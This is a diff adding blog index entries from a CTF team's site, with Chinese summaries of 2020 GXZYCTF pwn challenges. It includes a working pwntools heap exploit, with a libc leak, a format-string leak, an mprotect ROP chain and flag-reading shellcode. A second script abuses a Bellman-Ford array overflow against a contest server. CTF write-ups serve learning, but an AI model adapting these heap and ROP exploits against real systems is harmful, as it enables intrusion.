@@ -188,6 +188,742 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_easy_heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/21/2020_GXZYCTF_easy_heap/" class="post-title-link" itemprop="url">2020 GXZYCTF easy_heap</a>
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-21 09:52:20 / 修改时间：20:56:27" itemprop="dateCreated datePublished" datetime="2020-03-21T09:52:20+08:00">2020-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/Libc/" itemprop="url" rel="index"><span itemprop="name">Libc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/21/2020_GXZYCTF_easy_heap/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_musl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/21/2020_GXZYCTF_musl/" class="post-title-link" itemprop="url">2020 GXZYCTF musl</a>
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-21 09:52:20 / 修改时间：20:56:19" itemprop="dateCreated datePublished" datetime="2020-03-21T09:52:20+08:00">2020-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/Libc/" itemprop="url" rel="index"><span itemprop="name">Libc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          自定的libc，早期unlink，不存在malloc_hook和free_hook，最后覆盖栈上的EIP进行利用。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+8
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/21/2020_GXZYCTF_musl/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_lgd/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/21/2020_GXZYCTF_lgd/" class="post-title-link" itemprop="url">2020 GXZYCTF lgd</a>
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-21 09:52:20 / 修改时间：20:54:51" itemprop="dateCreated datePublished" datetime="2020-03-21T09:52:20+08:00">2020-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/Libc/" itemprop="url" rel="index"><span itemprop="name">Libc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>有沙盒功能，使用seccomp-tools dump ./pwn<br>之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">09</span>:<span class="number">36</span>:<span class="number">57</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    slf(<span class="string">"\n"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line">    sf(<span class="string">"___c___r__s__++___c___new_content ?"</span>,content)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    slf(<span class="string">"\n"</span>,<span class="string">"sofr_is_cool"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]) - <span class="number">0x3c4c08</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)#<span class="number">1</span></span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x3c4b50</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(<span class="number">0x81</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">2</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">4</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">0x60</span>)#<span class="number">5</span></span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(<span class="number">0x6033c0</span>))</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0x55800</span>+libc_addr))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">"%6$p|"</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    stack_addr = int(ru(<span class="string">"|"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.linux.cat(<span class="string">'./flag'</span>)</span><br><span class="line">    #shellcode = shellcraft.amd64.pushstr(<span class="string">"./flag"</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.open(<span class="string">'rsp'</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.read(<span class="string">'rax'</span>,<span class="string">'rsp'</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line">    print len(shellcode)</span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(stack_addr+<span class="number">0x48</span>)+p64(<span class="number">0x603260</span>)+p64(libc_addr+libc.symbols[<span class="string">'mprotect'</span>])+shellcode)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x0000040000000400</span>)*<span class="number">10</span>)</span><br><span class="line">    debug()</span><br><span class="line">    file_p = <span class="number">0x603360</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0x4023AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x603310</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x00603000</span>)+p64(<span class="number">0x402390</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x603318</span>))</span><br><span class="line">    #dele(<span class="number">1</span>)</span><br><span class="line">    #dele(<span class="number">0</span>)</span><br><span class="line">    ShowAddress(<span class="string">"libc_addr"</span>,libc_addr)</span><br><span class="line">    ShowAddress(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/21/2020_GXZYCTF_lgd/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_shotest_path/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/21/2020_GXZYCTF_shotest_path/" class="post-title-link" itemprop="url">2020 GXZYCTF lancet</a>
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-21 09:52:20 / 修改时间：20:58:13" itemprop="dateCreated datePublished" datetime="2020-03-21T09:52:20+08:00">2020-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/Libc/" itemprop="url" rel="index"><span itemprop="name">Libc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>最短路径算法的题目，应该是实现了Bellman_Ford算法，在Query a route功能查找最短路径时，当变量v5=200时，.BSS段上的NextJump数组溢出到Inuse数组的第一个，即&amp;NextJump[200]=&amp;Inuse[0]，往Inuse[0]写一个地址，可改变第一个Station的inuse状态。<br>当存在负值的环时，会一直执行for循环，直到遍历某个节点的次数大于总节点数时，即n*(n-1)次，当负值环的节点个数n&gt;=15时，可以达到遍历200次以上，从而触发上述漏洞。提前伪造好ptr[0]使其name_ptr指向flag地址即可。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from Fish import *</span><br><span class="line">#flag&#123;SPFA_1s_4_9o0d_A1gorithm&#125;</span><br><span class="line">get_shell(<span class="string">'Shortest_path:121.37.181.246:19008'</span> , <span class="string">'2.27'</span> , <span class="number">64</span>)#nc <span class="number">121.37</span>.<span class="number">181.246</span> <span class="number">19008</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(SID , SPrice , SName , table):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Price: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SPrice)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name Length: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(SName))</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name: \n'</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SName)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Number of connected station: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(table))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'station ID: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'distance: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">def free(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryStation(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryRoute(SID1 , SID2):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Source Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID1)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Target Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID2)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0</span>x6068E0</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0</span>,<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">0</span>x20,[(<span class="number">17</span>,<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>,<span class="number">200</span>,<span class="string">'b'</span>*<span class="number">0</span>x20,[(<span class="number">2</span>,-<span class="number">3</span>)])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">17</span>,<span class="number">10</span>,p64(<span class="number">17</span>)+p64(<span class="number">0</span>x6068e0),[(<span class="number">0</span>,<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">add</span>(i , <span class="number">200</span> , <span class="string">'Node'</span> + str(i) , [(i+<span class="number">1</span>,-<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">16</span> , <span class="number">600</span> , <span class="string">'Node16'</span> , [(<span class="number">2</span>,-<span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line">queryRoute(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">queryStation(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">active()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/03/21/2020_GXZYCTF_shotest_path/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_woodenbox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/21/2020_GXZYCTF_woodenbox/" class="post-title-link" itemprop="url">2020 GXZYCTF woodenbox</a>
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
